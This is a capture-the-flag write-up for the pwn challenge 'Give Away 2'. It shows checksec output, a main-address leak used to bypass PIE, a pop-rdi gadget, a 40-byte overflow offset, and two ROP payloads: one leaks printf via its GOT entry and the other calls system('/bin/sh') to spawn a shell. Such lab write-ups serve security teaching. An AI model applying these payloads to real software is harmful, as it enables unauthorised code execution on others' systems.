# Give Away 2

- Genre Pwn  

By examining the binary I found the followings  
```sh
file give_away_2 
give_away_2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5c93b7c4ff1a036cb291045d3ab76155d22ce1a6, not stripped
checksec give_away_2
[*] 'give_away_2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
So this was a 64 bit binary, and NX was enabled.  
To see what this binary did I ran this locally.  
```sh
./give_away_2
Give away: 0x5628b79f7864
test
``` 
It displayed an address of something, then accepted user input and terminated.  
I tried to find out what this address was by gdb.  

![image](https://user-images.githubusercontent.com/53568647/86327027-eb258b80-bc85-11ea-9496-2488462147f1.png)

By investigating the address, I found that it was an address of main function. Since Full RELRO was seen in this binary, .got.plt was not available.   
That being said, I could use this 'give away address' to find out the addresses which were required to build ROP chain.  


At this point, my strategy was to create a rop chain by using __'pop rdi;ret' > printf GOT address > printf in main function__  
Once printf in main function was called, vuln function would be called after leaking address of printf. Then another input would be possible, so that I could inject secound payload to call /bin/sh.  

## First BoF
First thing I had to do was to create rop gadget.  
```sh
rp -r 1 -f give_away_2 | grep rdi
0x0000094f: add byte [rbp+rdi*8-0x01], bh ; jmp qword [rax+rax+0x00] ;  (1 found)
0x0000093f: add byte [rbp+rdi*8-0x01], cl ; call qword [rax+rax-0x02A40000] ;  (1 found)
0x00000903: pop rdi ; ret  ;  (1 found)
```
I found there was pop rdi at 0x903. I confirmed ASLR was enabled and 3 digits on the right hand side would not change by running:
```sh
ldd give_away_2 
	linux-vdso.so.1 (0x00007ffcc9a8e000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f63dd32a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f63dd70e000)
ldd give_away_2 
	linux-vdso.so.1 (0x00007ffdf456e000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f56a8d5a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f56a913e000)
ldd give_away_2 
	linux-vdso.so.1 (0x00007ffc7b1db000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcdf0867000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fcdf0c4b000)
```
Since I could get the main address from the output, I could use it to determine the address of pop rdi as well.  

printf function was found in main function, and from gdb session I could confirm that the address was 0x880, which started from mov eax, 0x0.   

![image](https://user-images.githubusercontent.com/53568647/86327024-e95bc800-bc85-11ea-86b4-6520122b5f9f.png)


I also needed to find the right size of buffer to cause overflow. I used pattern_create and pattern_offset of gdb-peda.  

![image](https://user-images.githubusercontent.com/53568647/86327035-ecef4f00-bc85-11ea-9de3-3b223d7fb115.png)

so now, my first payload was:

```sh
padding = 40
payload = b'A' * padding
payload += p64(gadget)
payload += p64(printf_got)
payload += p64(printf_plt)
```

## Second BoF
The first BoF could leak the printf address, and I could calcurate libc address by subtracting the offset of printf from leaked address.  
By combining ROP chain again, I could call system and /bin/sh to get a shell.  
So the payload should be __'pop rdi: ret' > /bin/sh > system__. However, it was important to align the stack for this payload , so that it could read the function correctly. I added 'ret' in front of of 'pop rdi; ret' to fix the alignment. 'ret' was sitting next to 'pop rdi', so the address of ret was next to the gadget address.  
My second payload was:
```sh
payload = b'A' * padding
payload += p64(gadget+1)
payload += p64(gadget)
payload += p64(sh_address)
payload += p64(sys_address)
```
## Spawn a shell
I collected all the required addresses so I was good to go and ran the exploit to get a shell.  

![image](https://user-images.githubusercontent.com/53568647/86327039-eeb91280-bc85-11ea-8b45-be5e90d7a84e.png)

shkCTF{It's_time_to_get_down_to_business}

__NOTE__  
I spent a lot of time for the first BoF part, because I used 0x690 as the printf-plt address. Calling printf directly would ignore 'mov eax, 0x0' and it caused error inside of printf function. I used gdb to find out the error and understood that I should not have skipped the 'mov eax 0x0' part.  
